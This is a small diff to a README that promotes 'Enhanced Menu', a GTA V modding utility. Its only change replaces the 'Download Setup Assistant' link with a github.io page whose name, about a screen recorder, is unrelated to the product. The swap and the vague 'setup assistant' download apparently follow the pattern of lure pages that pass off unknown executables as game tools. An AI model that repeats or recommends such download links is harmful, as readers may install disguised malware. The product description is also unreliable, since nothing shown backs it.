@@ -3,7 +3,7 @@
 **Enhanced Menu** is a desktop utility tool designed to expand your experience in Grand Theft Auto V with a modular menu interface, offline configuration layers, and visual customization support. Built with immersion and flexibility in mind, this companion tool works alongside your local GTA V installation for expanded control and accessibility.
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://aslsimulrv-entertaiment.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://screenrecordermark.github.io/Screenrecordermerco/)
 
 ---
 
